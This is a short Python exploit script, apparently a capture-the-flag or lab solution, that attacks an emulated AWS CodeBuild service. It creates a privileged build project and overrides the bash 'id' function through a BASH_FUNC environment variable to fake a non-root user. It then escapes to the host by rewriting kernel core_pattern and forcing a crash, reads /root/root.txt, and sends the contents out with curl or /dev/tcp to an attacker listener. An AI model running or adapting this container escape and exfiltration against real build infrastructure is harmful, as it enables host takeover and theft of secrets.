#!/usr/bin/env python3
"""
Privileged CodeBuild + BASH_FUNC_id%% bypass + core_pattern host escape.
Run from worker container via SQS job.
"""
import boto3, base64, sys

LHOST = sys.argv[1] if len(sys.argv) > 1 else "10.10.15.199"
EP = "http://floci:4566"
cb = boto3.client("codebuild", endpoint_url=EP, region_name="us-east-1",
                  aws_access_key_id="test", aws_secret_access_key="test")

BUILDSPEC = r"""version: 0.2
phases:
  build:
    commands:
      - UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
      - printf '#!/bin/sh\ncat /root/root.txt > %s/rf 2>&1\nchmod 777 %s/rf\n' "$UDIR" "$UDIR" > /x.sh
      - chmod +x /x.sh
      - echo "|${UDIR}/x.sh" > /proc/sys/kernel/core_pattern
      - ulimit -c unlimited; bash -c 'kill -11 $$' || true
      - sleep 4
      - RF=$(cat /rf 2>/dev/null | base64 -w0)
      - curl -s "http://LHOST:9000/root_$RF" || exec 3<>/dev/tcp/LHOST/9000; printf "GET /root_%s HTTP/1.0\r\n\r\n" "$RF" >&3
""".replace("LHOST", LHOST)

P = "nimbus-poc"
try: cb.delete_project(name=P)
except: pass
cb.create_project(name=P, source={"type":"NO_SOURCE"}, artifacts={"type":"NO_ARTIFACTS"},
    environment={"type":"LINUX_CONTAINER","computeType":"BUILD_GENERAL1_SMALL",
                 "image":"floci/floci:latest","privilegedMode":True},
    serviceRole="arn:aws:iam::000000000000:role/codebuild-role")
cb.start_build(projectName=P,
    environmentVariablesOverride=[{"name":"BASH_FUNC_id%%","value":"() { echo uid=1000; }","type":"PLAINTEXT"}],
    buildspecOverride=BUILDSPEC)
print(f"[*] CodeBuild started for {P}")
